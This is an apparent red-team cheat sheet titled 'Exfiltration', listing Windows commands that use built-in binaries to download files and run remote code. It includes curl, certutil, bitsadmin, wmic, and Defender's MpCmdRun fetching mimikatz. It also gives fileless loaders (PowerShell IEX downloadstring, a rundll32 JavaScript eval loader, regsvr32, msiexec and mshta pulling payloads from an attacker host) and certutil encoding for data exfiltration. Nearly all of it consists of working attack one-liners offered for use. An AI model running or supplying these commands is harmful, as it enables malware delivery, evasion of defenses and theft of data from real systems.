# Exfiltration

### Download files from CMD/powershell

```csharp
#Curl
curl http://10.10.10.19:8000/file.exe --output file.exe

#CertUtil
certutil.exe -urlcache -f http://10.10.10.19/file.exe file.exe

#Wget
Invoke-WebRequest -Uri "http://10.10.10.19" -OutFile "C:\path\file"

#Powershell
powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.10.19/file', 'output-file')

#Bitsadmin
bitsadmin /transfer n http://10.10.10.19/imag/evil.txt d:\test\1.txt

#Wmic
wmic os get /FORMAT:"http://10.10.10.19/evil.xsl"

#Windows Defender
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -DownloadFile -url http://10.10.10.19/mimikatz.zip -path .\\mimikatz.zip
```

### Execute code without download files locally

```cpp
#Powershell
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.10.19/evil.txt'))"

#Rundll
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://10.10.10.19:8888/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}

#Regsrv32
regsvr32.exe /u /n /s /i:http://10.10.10.19:8888/file.sct scrobj.dll

#Msiexec
msiexec /q /i http://10.10.10.19/evil.msi

#Mshta
mshta http://10.10.10.19/run.hta
```

### Data Exfiltration

```csharp
#CertUtil
certutil -encode file outputfile.b64 //ENCODE file in base64
certutil -decode file.b64 outputfile //DECODE file in base64
```

### Zip/Unzip files

```csharp
#Powershell
Compress-Archive in.txt out.zip //zip
Expand-Archive out.zip //unzip
```

